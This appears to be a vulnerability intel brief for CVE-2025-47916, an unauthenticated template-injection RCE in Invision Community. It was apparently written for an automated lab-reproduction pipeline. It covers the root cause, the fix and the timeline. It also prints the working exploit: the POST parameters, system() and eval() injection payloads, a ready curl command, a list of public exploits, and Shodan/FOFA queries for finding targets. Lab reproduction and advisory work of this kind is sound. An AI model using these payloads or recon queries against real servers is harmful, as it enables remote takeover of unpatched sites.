# Intel Brief: CVE-2025-47916

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-47916 |
| **Title** | Invision Community < 5.0.7 — Unauthenticated Remote Code Execution via Template Injection |
| **Affected Software** | Invision Community (formerly IPS Community Suite / Invision Power Board) |
| **Vendor** | Invision Power Services, Inc. (invisioncommunity) |
| **Affected Versions** | 5.0.0 through 5.0.6 (inclusive) |
| **Patched Version** | 5.0.7 (released May 12, 2025) |
| **CVSS Score** | **10.0 CRITICAL** |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **EPSS** | 90.0% (99.6th percentile) — actively exploited |
| **CWE** | CWE-94 (Improper Control of Generation of Code / Code Injection), CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine) |
| **Published** | 2025-05-16 |
| **VulnCheck KEV** | 2025-06-06 (confirmed exploited in the wild) |
| **Discoverer** | Egidio Romano (EgiX) |

## Vulnerability Description

Invision Community 5.0.0 through 5.0.6 contains a critical unauthenticated Remote Code Execution (RCE) vulnerability in the **theme editor** functionality. The vulnerability exists in the `customCss()` method of the `IPS\core\modules\front\system\themeeditor` controller class, located at:

```
/applications/core/modules/front/system/themeeditor.php
```

### Root Cause

The `customCss()` method is a **protected controller method** that, despite being intended for administrative use, is **accessible to unauthenticated users** via the IPS routing mechanism. When invoked, it reads the `content` POST parameter and passes it directly to `Theme::makeProcessFunction()` — the IPS template engine compiler.

The IPS template engine supports a `{expression="..."}` syntax that compiles template expressions directly into PHP code via `eval()`. Because no authentication check guards the `customCss()` method, and no sanitization is applied to the `content` parameter before template compilation, an attacker can inject arbitrary PHP code.

### Attack Flow

1. Attacker sends a POST request to the application root (index.php) with:
   - `app=core`
   - `module=system`
   - `controller=themeeditor`
   - `do=customCss`
   - `content={expression="die('MARKER'.system(base64_decode('COMMAND')))"}`

2. The IPS router dispatches to `themeeditor::customCss()` — **no auth check**

3. The `content` value is passed to `Theme::makeProcessFunction()` which:
   - Parses `{expression="..."}` template tags
   - Compiles them into PHP: `<?php echo die('MARKER'.system(...)); ?>`
   - Evaluates the generated PHP via `eval()`

4. Arbitrary PHP code executes as the web server user (typically `www-data`)

5. Command output is returned in the HTTP response, extractable via the marker string

### Fix in 5.0.7

Version 5.0.7 (released May 12, 2025) addresses the vulnerability by:
- Adding authentication/authorization checks to the `customCss()` method
- Preventing unauthenticated users from invoking the theme editor endpoint

## Source Repository

**⚠ COMMERCIAL SOFTWARE — No public source repository exists.**

Invision Community is proprietary commercial software distributed through the vendor's download portal (https://invisioncommunity.com). There is no public GitHub/GitLab repository for the application source code.

### Approach for Lab Reproduction

A **synthetic vulnerable PHP application** has been created that faithfully reproduces the exact vulnerability mechanics:

| Path | Description |
|---|---|
| `vulnerable-app/index.php` | Vulnerable endpoint (reproduces IPS 5.0.0–5.0.6 behavior) |
| `vulnerable-app/index-patched.php` | Patched endpoint (reproduces IPS 5.0.7 behavior) |
| `vulnerable-app/admin/install/eula.txt` | Version file (for Metasploit check method compatibility) |
| `poc/poc.py` | Primary PoC script — Python |
| `poc/poc_vector2.py` | Alternative PoC vector — Python |
| `poc/poc_vector3.py` | Alternative PoC vector — Python |

The synthetic app reproduces:
- The IPS routing mechanism (app/module/controller/do parameters)
- The `customCss()` method without authentication
- The `makeProcessFunction()` template compiler with `{expression="..."}` tag evaluation
- The version detection file at `/admin/install/eula.txt`
- A patched version demonstrating the 5.0.7 fix (auth check + expression stripping)

## Build System & Lab Requirements

### Application Stack

| Component | Requirement |
|---|---|
| **Language** | PHP (the vulnerable application is PHP) |
| **PHP Version** | PHP 8.1+ (IPS 5.0 requires PHP 8.1 or higher) |
| **Web Server** | Apache with mod_php OR Nginx with PHP-FPM |
| **PHP Extensions** | None specifically required for the vulnerability; standard PHP is sufficient |
| **Database** | Not required for this vulnerability (no DB interaction in the exploit path) |
| **Build System** | None — plain PHP files served by a web server |

### Docker Lab Recommendations

The Lab Build agent should create a Docker environment with:

1. **Vulnerable container**: PHP 8.1/8.2 + Apache (e.g., `php:8.2-apache`)
   - Copy `vulnerable-app/` contents to `/var/www/html/`
   - Ensure `index.php` is served as the default
   - The `/admin/install/eula.txt` path must be accessible for version detection
   - PHP `system()` function must NOT be in `disable_functions`

2. **PoC runner container** (optional): Python 3 with `requests` library
   - For running the Python PoC from `poc/poc.py`

### Key Endpoint Details for Lab Verification

```
# Vulnerable endpoint (POST)
URL: http://target:80/index.php
POST params:
  app=core
  module=system
  controller=themeeditor
  do=customCss
  content={expression="die('________'.system(base64_decode('aWQ=')))"}

# Version detection (GET)
URL: http://target:80/admin/install/eula.txt
Expected: " IPS 5.0.6" in response body

# Quick verification command:
curl -s -X POST http://target:80/index.php \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  -d 'content={expression="die(\"________\".system(\"id\"))"}'
# Expected: uid=33(www-data) output followed by "________"
```

## Public Exploits

### 1. Metasploit Module [EXCELLENT] ✅ SAFE
| Field | Value |
|---|---|
| **ID** | EIP #68058 |
| **Source** | Metasploit Framework |
| **Classification** | `working_poc` (confidence: 100%) |
| **Attack Type** | RCE |
| **Complexity** | Trivial |
| **Reliability** | Reliable (REPEATABLE_SESSION, CRASH_SAFE) |
| **Auth Required** | Yes (Metasploit analysis says yes, but the vuln is unauthenticated — this may be a classification quirk) |
| **Authors** | Egidio Romano (EgiX), Valentin Lobstein |
| **URL** | https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/invision_customcss_rce.rb |
| **Rank** | Excellent |
| **Notes** | Full-featured module with version check via EULA file. Supports PHP in-memory, Linux CMD, and Windows CMD targets. |

### 2. ExploitDB PoC (EDB-52294) ✅ SAFE — RECOMMENDED FOR ADAPTATION
| Field | Value |
|---|---|
| **ID** | EIP #11030 / EDB-52294 |
| **Source** | ExploitDB |
| **Classification** | `working_poc` (confidence: 100%) |
| **Attack Type** | RCE |
| **Complexity** | Trivial |
| **Reliability** | Reliable |
| **Auth Required** | No |
| **Author** | Egidio Romano (EgiX) — original discoverer |
| **Language** | PHP (requires curl extension) |
| **Notes** | Clean, minimal PoC by the original vulnerability discoverer. Interactive shell. Best candidate for adaptation into a standalone PoC script. |

### 3. GitHub PoC (Web3-Serializer) ✅ SAFE
| Field | Value |
|---|---|
| **ID** | EIP #64400 |
| **Source** | GitHub (nomisec) |
| **Classification** | `working_poc` (confidence: 95%) |
| **Attack Type** | RCE |
| **Complexity** | Moderate |
| **Reliability** | Reliable |
| **Auth Required** | No |
| **Author** | Web3-Serializer |
| **Language** | Python (uses `requests` library) |
| **URL** | https://github.com/Web3-Serializer/CVE-2025-47916 |
| **Notes** | Python adaptation of EgiX's PoC. Supports single-command, test-only, and interactive modes. Good candidate for the PoC script. |

### Nuclei Template Available
- **Template**: CVE-2025-47916 (critical, verified)
- **Authors**: EgiX, iamnoooob, pdresearch
- **Tags**: cve, cve2025, invision, rce, ssti, unauth
- **Recon**: Shodan: `Set-Cookie: ips4_` | FOFA: `body="Invision" && body="ips4"`

## Exploit Payload Details

### Template Injection Payload Structure

The IPS template engine processes `{expression="..."}` tags by compiling the expression into PHP code and evaluating it. The exploit payloads use this mechanism:

**Command execution payload:**
```
{expression="die('________'.system(base64_decode('COMMAND_B64')))"}
```

**PHP eval payload (Metasploit):**
```
{expression="die(eval(base64_decode('PHP_CODE_B64')))"}
```

**Breakdown:**
- `{expression="..."}` — IPS template tag that evaluates PHP expressions
- `die()` — Halts execution and outputs the result (ensures clean output)
- `'________'` — Marker string for output extraction
- `system()` — Executes OS command and returns output
- `base64_decode()` — Decodes the command (avoids special character issues)

### POST Parameters

| Parameter | Value | Purpose |
|---|---|---|
| `app` | `core` | IPS application module |
| `module` | `system` | IPS module name |
| `controller` | `themeeditor` | Target controller |
| `do` | `customCss` | Target method (the vulnerable one) |
| `content` | `{expression="..."}` | Template injection payload |

## References

| Type | URL |
|---|---|
| **Vendor Release Notes** | https://invisioncommunity.com/release-notes-v5/507-r41/ |
| **Original Advisory** | https://karmainsecurity.com/KIS-2025-02 |
| **Full Disclosure** | http://seclists.org/fulldisclosure/2025/May/4 |
| **GHSA** | GHSA-96q3-fjrx-h9hh |
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2025-47916 |
| **ExploitDB** | https://www.exploit-db.com/exploits/52294 |
| **GitHub PoC** | https://github.com/Web3-Serializer/CVE-2025-47916 |
| **Metasploit** | https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/invision_customcss_rce.rb |

## Timeline

| Date | Event |
|---|---|
| 2025-05-10 | Vendor notification by Egidio Romano |
| 2025-05-12 | Patch released (version 5.0.7) |
| 2025-05-14 | CVE assigned (CVE-2025-47916) |
| 2025-05-14 | Public disclosure |
| 2025-05-16 | NVD published |
| 2025-06-06 | VulnCheck KEV added (confirmed exploitation in the wild) |

## Summary for Downstream Agents

**Lab Build Agent**: Use `php:8.2-apache` Docker image. Copy `vulnerable-app/` to `/var/www/html/`. No database needed. Ensure PHP `system()` is not disabled. The synthetic app at `index.php` faithfully reproduces the vulnerability. Test with the curl command in "Key Endpoint Details" above.

**PoC Agent**: Three working PoCs are available — the Python PoC (`poc/poc.py`) is the best starting point for adaptation. The payload is trivial: POST to `index.php` with the template injection in the `content` parameter. Output is extracted via the `________` marker string. Consider adding: (1) automatic vulnerability check, (2) command output parsing, (3) error handling, (4) verification against the patched version (should return 403).

**Vulnerability Analysis Agent**: This is a textbook Server-Side Template Injection (SSTI) to RCE chain. CWE-94 + CWE-1336. Attack complexity is LOW, no privileges required, no user interaction needed. The fix adds authentication checks and/or input sanitization to the customCss method.
